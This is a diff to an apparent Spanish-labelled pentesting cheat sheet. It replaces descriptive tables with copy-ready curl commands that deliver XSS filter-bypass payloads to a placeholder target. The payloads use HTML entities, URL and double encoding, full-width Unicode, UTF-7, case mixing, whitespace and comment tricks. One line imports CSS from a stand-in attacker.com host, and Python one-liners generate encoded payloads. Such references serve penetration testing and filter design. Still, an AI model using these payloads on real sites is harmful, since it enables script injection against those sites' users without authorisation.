@@ -23,20 +23,18 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `<` (less than) | `&lt;` | NOT bypass — already escaped. |
-| `<` decimal | `&#60;` | Browser parses as `<` after decode. |
-| `<` hex | `&#x3c;` | Same. |
-| `<` zero-padded | `&#0000060;` o `&#x0000003c;` | More zeros. |
-| `<` w/o semi | `&#60` | Some parsers tolerate. |
-| `<` mixed case hex | `&#x3C;` (uppercase X) | Same. |
-| Encoded tag | `&lt;script&gt;` | If filter only blocks literal `<script>`. |
-| Encoded letters | `&#83;cript` (S=83) | Letter encoded in middle. |
-| Numeric reference variants | `&#x0000003c;`, `&#0000060;` | Multiple length. |
-| Unicode escape | `<` (full-width) U+FF1C | NFKC-normalize bypass. |
-| Emoji-style | Various Unicode lookalikes | Limited but possible. |
-| Combined | `&#x3c;img&#x20;src&#x3d;...&#x3e;` | Full tag encoded. |
-| Half-encoded | `<i&#x6d;g src=...>` | Partial encoding. |
-| Tag attribute encoded | `<img s&#x72;c="...">` | Attribute name encoded. |
+| `curl 'https://target/?q=&#60;img src=x&#62;'` | Decimal entity `<` `>` — browser decodes | Filter blocks literal `<`. |
+| `curl 'https://target/?q=&#x3c;img src=x&#x3e;'` | Hex entity bypass | Same. |
+| `curl 'https://target/?q=&#0000060;img src=x&#0000062;'` | Zero-padded entity bypass length-check | Length filter. |
+| `curl 'https://target/?q=&#60img src=x&#62'` (no semicolon) | Missing semicolon — some parsers tolerate | Lax parser. |
+| `curl 'https://target/?q=&#x3C;img src=x&#x3E;'` | Mixed-case hex entity | Case filter. |
+| `curl 'https://target/?q=&lt;script&gt;alert(1)&lt;/script&gt;'` (post-decode XSS) | Filter strips literal but decodes later | Pre-storage filter. |
+| `curl 'https://target/?q=<i&#x6d;g src=x>'` | Half-encoded tag name | Partial filter. |
+| `curl 'https://target/?q=<img s&#x72;c="x">'` | Attribute name encoded | Attr-name filter. |
+| `curl 'https://target/?q=&#x3c;img&#x20;src&#x3d;x&#x3e;'` | Fully encoded full tag | Heavy filter. |
+| `curl 'https://target/?q=＜img src=x＞'` (U+FF1C/FF1E full-width) | Unicode full-width less/greater than | NFKC normalize bypass. |
+| `python3 -c "print('&#'+';&#'.join(str(ord(c)) for c in '<img src=x>'))"` | Generate decimal entity payload | DIY encoder. |
+| `python3 -c "print(''.join(f'&#x{ord(c):x};' for c in '<img src=x onerror=alert(1)>'))"` | Generate hex entity payload | DIY hex encoder. |
 ^htmli-bypass-entity
 
 ___
@@ -45,20 +43,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| URL encode `<` | `%3C` | Bypass HTTP-layer filters. |
-| URL encode `>` | `%3E` | Same. |
-| URL encode `"` | `%22` | Attribute context. |
-| Doble URL encode | `%253C` | If multi-decode. |
-| Unicode char `＜` (U+FF1C) | Full-width less-than | NFKC normalization. |
-| Unicode char `›` | Single right angle quotation | Edge. |
-| Right-to-left override `‮` | Visual reordering | Lookalike domain abuse. |
-| Mixed encoding | URL + entity en mismo payload | Multi-layer bypass. |
-| Hex escape | `\x3c` literal | If interpreted (rare). |
-| Octal escape | `\074` | Edge. |
-| UTF-7 (legacy) | `+ADw-script+AD4-` | Old browsers. |
-| UTF-16 BE/LE BOM | Byte order mark prefix | Edge. |
-| Punycode | `xn--...` | Domain spoofing context. |
-| Reserved char encoding | `%26` for `&`, `%23` for `#` | Encoded entities. |
+| `curl 'https://target/?q=%3Cimg%20src%3Dx%3E'` | Standard URL encode `<` `>` | HTTP-layer filter. |
+| `curl 'https://target/?q=%253Cimg%2520src%253Dx%253E'` | Double URL encode `%3C` → `%253C` | Multi-decode chain. |
+| `curl --data-urlencode 'q=<img src=x>' https://target/x` | curl helper auto-encode | Easy encode. |
+| `curl 'https://target/?q=%EF%BC%9Cimg src=x%EF%BC%9E'` | UTF-8 encoded U+FF1C/FF1E | Unicode normalize. |
+| `curl 'https://target/?q=+ADw-img src=x+AD4-'` (UTF-7 legacy) | UTF-7 encoded angle brackets | Old browsers + charset. |
+| `curl 'https://target/?q=%uFF1Cimg src=x%uFF1E'` (% u-encoding) | %u-encoding bypass | Legacy IE. |
+| `curl --data-urlencode 'q=‮<rcs‭ipt>...' https://target/` | RTL override Unicode reorder | Visual bypass. |
+| `curl 'https://target/?q=%3c%3Cimg src=x%3e%3E'` | Mixed case hex encoded | Case mix. |
+| `curl 'https://target/?q=%C0%BCimg src=x%C0%BE'` (overlong UTF-8) | Overlong UTF-8 bypass | Old parser. |
+| `curl 'https://target/?q=<img src=x>'` (JS-escape) | JS \u escape | JS context. |
+| `python3 -c "import urllib.parse; print(urllib.parse.quote_plus('<img src=x>'))"` | Python URL encode | DIY URL encoder. |
+| `python3 -c "s='<img src=x>'; print(''.join('%%%02X' % ord(c) for c in s))"` | Manual percent encoding | Custom encoder. |
 ^htmli-bypass-url
 
 ___
@@ -67,19 +63,19 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `<script>` lowercase | `<SCRIPT>` uppercase | Some filters case-sensitive. |
-| Mixed case | `<ScRiPt>` | Same. |
-| Tag attribute case | `<img SRC="...">` | Attribute names case-insensitive en HTML. |
-| Insert null between letters | `<scr%00ipt>` | Some browsers tolerate. |
-| Tag with no space | `<imgsrc=x>` | NOT valid but some parsers accept. |
-| Non-standard tag | `<svG>`, `<MaTh>` | Less filtered tags. |
-| Self-closing variants | `<br/>` vs `<br>` vs `<br >` | Whitespace variants. |
-| Tag with extra whitespace | `<     script     >` | Spaces tolerated. |
-| HTML comment break | `<scr<!-- -->ipt>` | NOT valid en strict parsing. |
-| Multi-line tag | `<img\nsrc=\nx>` | Newlines en tags ok. |
-| Tag with `/` self-close | `<svg/>` | XML-style. |
-| HTML5 specific tags | `<picture>`, `<source>`, `<details>` | Less filtered. |
-| Conditional comments | `<!--[if IE]><script>...<![endif]-->` | IE only. |
+| `curl 'https://target/?q=<SCRIPT>alert(1)</SCRIPT>'` | Uppercase tag bypass | Case-sensitive filter. |
+| `curl 'https://target/?q=<ScRiPt>alert(1)</sCrIpT>'` | Mixed case | Same. |
+| `curl 'https://target/?q=<IMG SRC=x onerror=alert(1)>'` | Uppercase attribute | Attr case filter. |
+| `curl 'https://target/?q=<svG onload=alert(1)>'` | Non-standard tag less-filtered | Whitelist gap. |
+| `curl 'https://target/?q=<MaTh href="javascript:alert(1)">CLICK</MaTh>'` | MathML tag less-filtered | MathML edge. |
+| `curl 'https://target/?q=<details ontoggle=alert(1) open>x</details>'` | HTML5 details event-based XSS | HTML5 less-filtered. |
+| `curl 'https://target/?q=<picture><source srcset=javascript:alert(1)></picture>'` | Picture/source modern HTML5 | Whitelist gap. |
+| `curl 'https://target/?q=<     img     src=x     onerror=alert(1)>'` | Extra whitespace tolerated | Spaces in tag. |
+| `curl $'https://target/?q=<img\\tsrc=x\\tonerror=alert(1)>'` | Tab separator in tag | Whitespace variants. |
+| `curl $'https://target/?q=<img\\nsrc=x\\nonerror=alert(1)>'` | Newline separator | Multi-line tag. |
+| `curl 'https://target/?q=<svg/onload=alert(1)>'` | Slash separator no whitespace | XML-style. |
+| `curl 'https://target/?q=<img/src/=x/onerror=alert(1)>'` | Multi-slash separator | Bizarre but valid. |
+| `curl 'https://target/?q=<a HrEf="javascript:alert(1)">x</a>'` | Mixed case href attribute | Same case bypass. |
 ^htmli-bypass-case
 
 ___
@@ -88,20 +84,19 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Tab in tag | `<img\tsrc=x>` | Browser normalizes. |
-| Newline in tag | `<img\nsrc=x>` | Same. |
-| Vertical tab | `<img\x0bsrc=x>` | Edge. |
-| Form feed | `<img\x0csrc=x>` | Edge. |
-| NUL byte | `<img\x00src=x>` | Some parsers truncate. |
-| Carriage return | `<img\rsrc=x>` | Same as newline. |
-| Multi-whitespace en attr | `<img   src   =   x>` | Spaces around `=`. |
-| Quotes optional | `<img src=x>` (sin quotes) | HTML allows attr sin quotes para simple values. |
-| Single vs double quotes | `<img src='x'>` vs `<img src="x">` | Both valid. |
-| Backtick quotes | `<img src=\`x\`>` | NON-standard but IE tolerated. |
-| Quote replacement con encoded | `<img src=&#x22;...&#x22;>` | Attribute string entity-encoded. |
-| Whitespace in attr value | `<img src=" x">` | Leading whitespace. |
-| Tag with extra `>` | `<img src=x>>` | Extra char tolerated. |
-| Comments inside tag | `<img <!-- --> src=x>` | NOT valid mostly. |
+| `curl $'https://target/?q=<img\\tsrc=x\\tonerror=alert(1)>'` | Tab between attrs | Browser normalizes. |
+| `curl $'https://target/?q=<img\\nsrc=x\\nonerror=alert(1)>'` | Newline in tag | Same. |
+| `curl $'https://target/?q=<img\\x0bsrc=x\\x0bonerror=alert(1)>'` | Vertical tab separator | Edge. |
+| `curl $'https://target/?q=<img\\x0csrc=x\\x0conerror=alert(1)>'` | Form feed separator | Edge. |
+| `curl $'https://target/?q=<img\\rsrc=x\\ronerror=alert(1)>'` | Carriage return separator | Same as newline. |
+| `curl 'https://target/?q=<img   src   =   x   onerror   =   alert(1)>'` | Spaces around `=` | Whitespace-around-equals. |
+| `curl 'https://target/?q=<img src=x onerror=alert(1)>'` | No quotes around attribute | Unquoted attrs valid. |
+| `curl "https://target/?q=<img src='x' onerror='alert(1)'>"` | Single quotes | Both quote types valid. |
+| `curl 'https://target/?q=<img src=\`x\` onerror=\`alert(1)\`>'` | Backtick quotes (legacy IE) | IE-specific. |
+| `curl 'https://target/?q=<img src=&#x22;x&#x22; onerror=alert(1)>'` | Entity-encoded quotes | Quote filter. |
+| `curl 'https://target/?q=<img src="  x" onerror=alert(1)>'` | Leading whitespace in attr | Attr value whitespace. |
+| `curl 'https://target/?q=<img src=x onerror=alert(1)>>'` | Extra `>` tolerated | Extra char. |
+| `curl 'https://target/?q=<img src=x onerror=alert(1) /'` | Missing `>` self-close | Edge parse. |
 ^htmli-bypass-whitespace
 
 ___
@@ -110,18 +105,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Standard comment | `<!-- comment -->` | HTML comments. |
-| Filter break | `<scr<!---->ipt>` | If filter doesn't strip comments. |
-| Comment terminator | `--!>` | Edge case terminator. |
-| Conditional comment | `<!--[if IE]>...<![endif]-->` | IE only — modern browsers ignore. |
-| Conditional comment outside IE | `<!--[if !IE]>--><script>...<!--<![endif]-->` | Reverse condition. |
-| Mismatched comment | `<!-- a --> b --> c` | Multi-comment handling. |
-| Comment with HTML | `<!-- <script>alert(1)</script> -->` | NOT executed in standard. |
-| Server-side comment leak | If comment includes secret | Disclosure. |
-| Persistent comment | Stored input con comment | Deface but invisible. |
-| MultiByte comment | Unicode comment chars | Edge. |
-| CDATA section | `<![CDATA[...]]>` | XML CDATA — only in XML serialization. |
-| Processing instruction | `<?php ?>` like | XML-only. |
+| `curl 'https://target/?q=<scr<!---->ipt>alert(1)</script>'` | Inline comment splits filter substring | Substring filter. |
+| `curl 'https://target/?q=<scr<!-- -->ipt>alert(1)</script>'` | Same with whitespace inside | Same. |
+| `curl 'https://target/?q=<img src=x --!> onerror=alert(1)>'` | Comment terminator `--!>` | Edge terminator. |
+| `curl 'https://target/?q=<!--[if IE]><script>alert(1)</script><![endif]-->'` | IE conditional comment | IE-only. |
+| `curl 'https://target/?q=<!--[if !IE]>--><script>alert(1)</script><!--<![endif]-->'` | Reverse IE conditional | Non-IE execute. |
+| `curl 'https://target/?q=<!-- a --> alert(1) <!-- b -->'` | Multi-comment chained | Multi-comment parser. |
+| `curl 'https://target/?q=<a href="javascript:/*--><img src=x onerror=alert(1)>*/">x</a>'` | Comment inside attr | Attr context bypass. |
+| `curl 'https://target/?q=<style>/* */@import url(//attacker.com/x.css)</style>'` | CSS comment + @import bypass | CSS context. |
+| `curl 'https://target/?q=<![CDATA[<script>alert(1)</script>]]>'` | XML CDATA section | XML serialization. |
+| `curl 'https://target/?q=<? <script>alert(1)</script> ?>'` | Processing instruction | XML-only edge. |
+| `curl 'https://target/?q=<!--<script>alert(1)//-->'` | Comment-script confusion | Old parser edge. |
+| `curl 'https://target/?q=<![if IE]><script>alert(1)</script><![endif]>'` | Downlevel-revealed conditional | IE non-standard. |
 ^htmli-bypass-comment
 
 ***
